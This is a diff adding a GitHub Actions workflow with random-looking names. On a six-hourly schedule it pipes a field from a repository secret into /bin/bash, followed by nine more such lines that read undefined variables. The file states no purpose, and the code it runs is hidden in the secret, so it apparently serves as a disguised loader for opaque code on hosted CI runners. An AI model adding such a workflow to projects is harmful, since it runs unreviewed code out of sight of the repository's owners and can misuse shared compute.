@@ -1,0 +1,26 @@
+name: wanquanzenib
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wanquanzenib
+        env:
+          ncsoj380: ${{ secrets.ncsoj380 }}
+        run: |
+          echo $ncsoj380 | jq -r .kk045 | /bin/bash
+          echo $g38 | jq -r .stc6 | /bin/bash
+          echo $b50 | jq -r .oekul1012 | /bin/bash
+          echo $apsv55 | jq -r .tji7 | /bin/bash
+          echo $dxsq874 | jq -r .wffea13110 | /bin/bash
+          echo $srvg3226 | jq -r .dmsk1 | /bin/bash
+          echo $vdodo17896 | jq -r .jnx58836 | /bin/bash
+          echo $gkwv343 | jq -r .bm4 | /bin/bash
+          echo $mkv82827 | jq -r .oo26 | /bin/bash
+          echo $bzh508 | jq -r .rl017 | /bin/bash
+
